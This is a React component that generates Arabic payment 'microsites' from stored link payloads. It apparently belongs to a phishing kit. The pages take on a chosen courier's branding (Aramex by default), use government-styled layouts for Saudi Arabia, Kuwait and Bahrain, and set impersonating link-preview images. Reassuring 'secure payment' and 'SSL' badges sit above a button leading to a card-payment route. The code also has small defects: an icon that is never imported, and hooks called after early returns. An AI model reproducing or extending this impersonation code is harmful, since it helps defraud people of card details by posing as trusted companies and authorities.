import React from "react";
import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
import { getServiceBranding } from "@/lib/serviceLogos";
import { gccShippingServices } from "@/lib/gccShippingServices";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency } from "@/utils/countryData";
import SEOHead from "@/components/SEOHead";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";
import { DynamicIdentityProvider, DynamicIdentityWrapper } from "@/components/DynamicIdentityProvider";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import {
  MapPin,
  Users,
  CheckCircle2,
  CreditCard,
  Shield,
  Sparkles,
  Package,
  Truck,
  Hash,
  FileText,
  Heart,
  Building2,
} from "lucide-react";

const Microsite = () => {
  const { country, type, id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading, isError } = useLink(id);
  const countryData = getCountryByCode(country || "");
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (link || isError) {
      setShowPage(true);
    }
  }, [link, isError]);
  
  if (isLoading && !showPage) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (!link || !countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground">الرجاء التحقق من الرابط</p>
        </div>
      </div>
    );
  }
  
  const payload = link.payload;

  // Get amount from payload - ensure it's a number, handle all data types
  const rawAmount = payload.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Determine service type
  const isShipping = link.type === 'shipping';
  const isInvoice = link.type === 'invoices';
  const isHealth = link.type === 'health';
  const isLogistics = link.type === 'logistics';
  const isContracts = link.type === 'contracts';
  const isChalet = link.type === 'chalet';

  // Get service branding for SEO and display
  const serviceName = payload.service_name || payload.chalet_name;
  const serviceKey = payload.service_key || 'aramex';
  const serviceBranding = getServiceBranding(serviceKey);

  // Get dynamic company metadata for OG tags
  const companyMeta = getCompanyMeta(serviceKey);

  // Update URL to include service information for better SEO
  useEffect(() => {
    const currentUrl = new URL(window.location.href);
    if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
      currentUrl.searchParams.set('service', serviceKey);
      window.history.replaceState({}, '', currentUrl.toString());
    }
  }, [isShipping, serviceKey]);

  // Get service description from serviceBranding to match the chosen company
  const serviceDescription = serviceBranding.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;

  const displayName = isShipping
    ? `شحنة ${serviceName}`
    : isInvoice
    ? `فاتورة ${payload.invoice_number}`
    : isHealth
    ? `حجز ${payload.service_type_label || 'خدمة صحية'}`
    : isLogistics
    ? `شحن ${payload.service_type_label || 'خدمة لوجستية'}`
    : isContracts
    ? `عقد ${payload.template_name}`
    : payload.chalet_name;

  // SEO metadata - Use dynamic company meta when available
  const seoTitle = isShipping
    ? companyMeta.title || `تتبع وتأكيد الدفع - ${serviceName}`
    : isInvoice
    ? `فاتورة ${payload.invoice_number} - ${countryData.nameAr}`
    : isHealth
    ? `${payload.service_type_label} - ${countryData.nameAr}`
    : isLogistics
    ? `شحن ${payload.service_type_label} - ${countryData.nameAr}`
    : isContracts
    ? `عقد ${payload.template_name} - ${countryData.nameAr}`
    : `حجز شاليه - ${payload.chalet_name}`;
  const seoDescription = isShipping
    ? companyMeta.description || `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
    : isInvoice
    ? `فاتورة رقم ${payload.invoice_number} - إجمالي ${payload.total} ${payload.currency}`
    : isHealth
    ? `${payload.service_type_label} - ${payload.appointment_date} ${payload.appointment_time}`
    : isLogistics
    ? `شحن من ${payload.sender_name} إلى ${payload.receiver_name}`
    : isContracts
    ? `${payload.template_name} - ${payload.template_category}`
    : `احجز ${payload.chalet_name} في ${countryData.nameAr} - ${payload.nights} ليلة لـ ${payload.guest_count} ضيف`;
  const seoImage = companyMeta.image || serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
  
  const formattedAmount = formatCurrency(amount, country || "SA");

  const renderContent = () => {
    return (
      <div className="p-8">
        {/* Company Logo/Icon */}
        <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center p-4">
          {isShipping && serviceBranding.logo ? (
            <img 
              src={serviceBranding.logo} 
              alt={serviceName}
              className="max-h-full max-w-full object-contain"
              onError={(e) => {
                e.currentTarget.style.display = 'none';
                const parent = e.currentTarget.parentElement;
                if (parent) {
                  parent.innerHTML = '<svg class="w-16 h-16 text-muted-foreground" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4"></path></svg>';
                }
              }}
            />
          ) : isShipping ? (
            <Truck className="w-16 h-16 text-muted-foreground" />
          ) : isInvoice ? (
            <FileText className="w-16 h-16 text-muted-foreground" />
          ) : isHealth ? (
            <Heart className="w-16 h-16 text-muted-foreground" />
          ) : isLogistics ? (
            <Package className="w-16 h-16 text-muted-foreground" />
          ) : isContracts ? (
            <Building2 className="w-16 h-16 text-muted-foreground" />
          ) : (
            <Sparkles className="w-16 h-16 text-muted-foreground" />
          )}
        </div>
        
        {/* Service Info for Shipping */}
        {isShipping && (
          <div className="mb-6 p-4 bg-secondary/20 rounded-lg border">
            <div className="flex items-center gap-3 mb-2">
              {serviceBranding.logo && (
                <img 
                  src={serviceBranding.logo} 
                  alt={serviceName}
                  className="h-8 w-auto object-contain"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              )}
              {!serviceBranding.logo && <Package className="w-5 h-5 text-primary" />}
              <h3 className="font-bold text-lg">{serviceName}</h3>
            </div>
            <p className="text-sm text-muted-foreground">{serviceDescription}</p>
          </div>
        )}
        
        {/* Details Grid */}
        <div className="grid md:grid-cols-2 gap-6 mb-8">
        {isInvoice ? (
          <>
            <div className="flex items-start gap-3">
              <FileText className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">رقم الفاتورة</p>
                <p className="text-muted-foreground text-sm">
                  {payload.invoice_number}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <Users className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">العميل</p>
                <p className="text-muted-foreground text-sm">
                  {payload.client_name}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">تاريخ الإصدار</p>
                <p className="text-muted-foreground text-sm">
                  {payload.issue_date}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CreditCard className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">الإجمالي</p>
                <p className="text-muted-foreground text-sm">
                  {formatCurrency(payload.total, getCurrencyCode(country || "SA"))}
                </p>
              </div>
            </div>
          </>
        ) : isHealth ? (
          <>
            <div className="flex items-start gap-3">
              <Users className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">اسم المريض</p>
                <p className="text-muted-foreground text-sm">
                  {payload.patient_name}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <Heart className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">نوع الخدمة</p>
                <p className="text-muted-foreground text-sm">
                  {payload.service_type_label}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">تاريخ الموعد</p>
                <p className="text-muted-foreground text-sm">
                  {payload.appointment_date} - {payload.appointment_time}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CreditCard className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">الطبيب</p>
                <p className="text-muted-foreground text-sm">
                  {payload.doctor_name || 'غير محدد'}
                </p>
              </div>
            </div>
          </>
        ) : isLogistics ? (
          <>
            <div className="flex items-start gap-3">
              <MapPin className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">المرسل</p>
                <p className="text-muted-foreground text-sm">
                  {payload.sender_name}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <MapPin className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">المستلم</p>
                <p className="text-muted-foreground text-sm">
                  {payload.receiver_name}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <Package className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">نوع الشحنة</p>
                <p className="text-muted-foreground text-sm">
                  {payload.package_type_label}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CreditCard className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">الوزن</p>
                <p className="text-muted-foreground text-sm">
                  {payload.package_weight} كجم
                </p>
              </div>
            </div>
          </>
        ) : isContracts ? (
          <>
            <div className="flex items-start gap-3">
              <FileText className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">نوع العقد</p>
                <p className="text-muted-foreground text-sm">
                  {payload.template_name}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <Users className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">الفئة</p>
                <p className="text-muted-foreground text-sm">
                  {payload.template_category}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">تاريخ الإنشاء</p>
                <p className="text-muted-foreground text-sm">
                  {new Date().toLocaleDateString('ar-SA')}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <Shield className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">الحالة</p>
                <p className="text-muted-foreground text-sm">
                  جاهز للتوقيع والدفع
                </p>
              </div>
            </div>
          </>
        ) : (
          <>
            <div className="flex items-start gap-3">
              <MapPin className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">الموقع</p>
                <p className="text-muted-foreground text-sm">
                  {countryData.nameAr}
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <Users className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">عدد الضيوف</p>
                <p className="text-muted-foreground text-sm">
                  {payload.guest_count} ضيوف
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">مدة الإقامة</p>
                <p className="text-muted-foreground text-sm">
                  {payload.nights} ليالي
                </p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CreditCard className="w-5 h-5 text-primary mt-1" />
              <div>
                <p className="font-semibold mb-1">تاريخ الوصول</p>
                <p className="text-muted-foreground text-sm">
                  {payload.check_in}
                </p>
              </div>
            </div>
          </>
        )}
        </div>
        
        {/* Payment Button */}
        <Button 
          className="w-full py-6 text-lg font-bold bg-gradient-primary shadow-lg hover:shadow-xl transition-all"
          onClick={() => navigate(`/pay/${id}/card`)}
        >
          <CreditCard className="w-5 h-5 ml-2" />
          <span>إكمال عملية الدفع ({formattedAmount})</span>
        </Button>
        
        {/* Security Badges */}
        <div className="mt-8 flex items-center justify-center gap-6 opacity-60">
          <div className="flex items-center gap-1.5">
            <Shield className="w-4 h-4" />
            <span className="text-xs font-medium">دفع آمن</span>
          </div>
          <div className="flex items-center gap-1.5">
            <Lock className="w-4 h-4" />
            <span className="text-xs font-medium">تشفير SSL</span>
          </div>
          <div className="flex items-center gap-1.5">
            <CheckCircle2 className="w-4 h-4" />
            <span className="text-xs font-medium">موثّق</span>
          </div>
        </div>
      </div>
    );
  };

  return (
    <DynamicIdentityProvider entityKey={serviceKey}>
      <SEOHead
        title={seoTitle}
        description={seoDescription}
        image={seoImage}
        url={window.location.href}
        type="website"
        serviceName={serviceName}
        serviceDescription={serviceDescription}
        companyKey={serviceKey}
        currency={getCurrencyCode(country || "SA")}
      />
      <DynamicIdentityWrapper entityKey={serviceKey} variant="full" showAnimatedHeader={true}>
        {(() => {
          if (isShipping) {
            const Layout = getCompanyLayout(serviceKey);
            return (
              <Layout 
                companyKey={serviceKey} 
                amount={formattedAmount} 
                trackingNumber={payload.tracking_number || `TRK-${id?.substring(0, 8).toUpperCase()}`}
              >
                {renderContent()}
              </Layout>
            );
          }

          if (country === 'SA' || country === 'KW' || country === 'BH') {
            const Layout = getGovernmentLayout(country);
            return (
              <Layout 
                countryCode={country} 
                amount={formattedAmount} 
                serviceName={displayName}
              >
                {renderContent()}
              </Layout>
            );
          }

          return (
            <div className="min-h-screen py-12" dir="rtl">
              <div className="container mx-auto px-4">
                <div className="mb-4">
                  <BackButton />
                </div>
                
                <div className="max-w-4xl mx-auto">
                  {/* Header Badge */}
                  <div className="text-center mb-8">
                    <Badge className="text-lg px-6 py-2 bg-gradient-primary">
                      <Shield className="w-4 h-4 ml-2" />
                      <span>عقد موثّق ومحمي</span>
                    </Badge>
                  </div>
                  
                  {/* Main Card */}
                  <Card className="overflow-hidden shadow-elevated">
                    {/* Header with Country Colors */}
                    <div
                      className="h-32 relative"
                      style={{
                        background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
                      }}
                    >
                      <div className="absolute inset-0 bg-black/20" />
                      <div className="absolute bottom-4 right-6 text-white">
                        <h1 className="text-3xl font-bold">
                          {isInvoice
                            ? `فاتورة ${payload.invoice_number}`
                            : isHealth
                            ? payload.service_type_label
                            : isLogistics
                            ? payload.service_type_label
                            : isContracts
                            ? payload.template_name
                            : payload.chalet_name}
                        </h1>
                        <p className="text-lg opacity-90">{countryData.nameAr}</p>
                      </div>
                    </div>
                    
                    {renderContent()}
                  </Card>
                </div>
              </div>
               <div className="h-20" />
            </div>
          );
        })()}
        <BottomNav />
      </DynamicIdentityWrapper>
    </DynamicIdentityProvider>
  );
};

export default Microsite;
